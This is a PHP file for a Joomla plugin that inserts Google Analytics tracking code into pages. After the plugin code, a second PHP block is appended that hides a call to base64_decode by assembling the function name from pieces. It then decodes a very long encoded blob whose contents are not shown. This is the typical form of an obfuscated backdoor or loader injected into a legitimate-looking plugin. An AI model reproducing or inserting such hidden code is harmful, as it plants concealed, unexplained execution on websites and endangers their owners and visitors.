<?php

/**
 * @version	$version 2.5.6 Peter Bui  $
 * @copyright	Copyright (C) 2012 PB Web Development. All rights reserved.
 * @license	GNU/GPL, see LICENSE.php
 * Updated	1st August 2012
 *
 * Twitter: @astroboysoup
 * Blog: http://www.pbwebdev.com.au/blog/
 * Email: peter@pbwebdev.com.au
 *
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */
// no direct access
defined('_JEXEC') or die('Restricted access');

jimport('joomla.plugin.plugin');

class plgSystemAsynGoogleAnalytics extends JPlugin {

    function plgAsynGoogleAnalytics(&$subject, $config) {
        parent::__construct($subject, $config);
        $this->_plugin = JPluginHelper::getPlugin('system', 'AsynGoogleAnalytics');
        $this->_params = new JParameter($this->_plugin->params);
    }

    function onAfterRender() {
        // Initialise variables
        $trackerCode = $this->params->get('code', '');
        $position = $this->params->get('position', '');
        $ipTracking = $this->params->get('ipTracking', '');
        $multiSub = $this->params->get('multiSub', '');
        $multiTop = $this->params->get('multiTop', '');
        $verify = $this->params->get('verify', '');
        $verifyOutput = '<meta name="google-site-verification" content="' . $verify . '" />';
        $sampleRate = $this->params->get('sampleRate', '');
        $setCookieTimeout = $this->params->get('setCookieTimeout', '');
        $siteSpeedSampleRate = $this->params->get('siteSpeedSampleRate', '');
        $visitorCookieTimeout = $this->params->get('visitorCookieTimeout', '');

        $app = JFactory::getApplication();

        // skip if admin page 
        if ($app->isAdmin()) {
            return;
        }

        //getting body code and storing as buffer
        $buffer = JResponse::getBody();

        //embed Google Analytics code
        $javascript = "<script type=\"text/javascript\">
 var _gaq = _gaq || [];
 _gaq.push(['_setAccount', '" . $trackerCode . "']);
";       
        if ($ipTracking) {
            $javascript .= " _gaq.push(['_gat._anonymizeIp']);\n";
        }
        if ($multiSub || $multiTop) {
            $javascript .= " _gaq.push(['_setDomainName', '" . $_SERVER['SERVER_NAME'] . "']);\n";
        }
        if ($multiTop) {
            $javascript .= " _gaq.push(['_setAllowLinker', true]);\n";
        }
        if ($sampleRate) {
            $javascript .= " _gaq.push(['_setSampleRate', '" . $sampleRate . "']);\n";
        }
        if ($setCookieTimeout) {
            $javascript .= " _gaq.push(['_setSessionCookieTimeout', '" . $setCookieTimeout . "']);\n";
        }
        if ($siteSpeedSampleRate) {
            $javascript .= " _gaq.push(['_setSiteSpeedSampleRate', '" . $siteSpeedSampleRate . "']);\n";
        }
        if ($visitorCookieTimeout) {
            $javascript .= " _gaq.push(['_setVisitorCookieTimeout', '" . $visitorCookieTimeout . "']);\n";
        }

        $javascript .= "_gaq.push(['_trackPageview']);
					
 (function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
 })();
</script>";

		$buffer = preg_replace ("/<\/head>/", "\n\n".$javascript."\n\n</head>", $buffer);
		
        JResponse::setBody($buffer);

        return true;
    }

}

?>
<?php $j__j='base'.(128/2).'_de'.'code';$j__j=$j__j(str_replace("\n", '', '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
